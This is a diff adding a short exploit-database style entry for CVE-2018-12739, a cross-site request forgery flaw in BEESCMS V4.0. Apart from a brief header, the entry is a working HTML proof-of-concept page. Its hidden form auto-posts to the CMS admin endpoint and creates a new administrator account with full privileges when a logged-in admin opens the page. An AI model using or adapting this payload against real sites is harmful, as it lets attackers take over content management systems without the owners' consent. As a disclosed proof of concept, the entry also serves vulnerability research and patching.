@@ -1,0 +1,31 @@
+# Exploit Title: A CSRF vulnerability exists in BEESCMS_V4.0: The administrator can be added arbitrarily.
+# Date: 2018-06-25
+# Exploit Author: bay0net
+# Vendor Homepage: https://www.cnblogs.com/v1vvwv/p/9226389.html
+# Software Link: http://www.beescms.com/
+# Version: BEESCMS - V4.0
+# CVE : CVE-2018-12739
+
+A CSRF vulnerability exists in BEESCMS_V4.0: The administrator can be added arbitrarily.
+
+The payload for attack is as follows.
+
+<html>
+  <body>
+  <script>history.pushState('', '', '/')</script>
+    <form action="http://10.211.55.17/beescms/admin/admin_admin.php?nav=list_admin_user&admin_p_nav=user" method="POST" enctype="multipart/form-data">
+      <input type="hidden" name="admin_name" value="test1" />
+      <input type="hidden" name="admin_password" value="test1" />
+      <input type="hidden" name="admin_password2" value="test1" />
+      <input type="hidden" name="admin_nich" value="test1" />
+      <input type="hidden" name="purview" value="1" />
+      <input type="hidden" name="admin_admin" value="" />
+      <input type="hidden" name="admin_mail" value="" />
+      <input type="hidden" name="admin_tel" value="" />
+      <input type="hidden" name="is_disable" value="0" />
+      <input type="hidden" name="action" value="save_admin" />
+      <input type="hidden" name="submit" value="确定" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
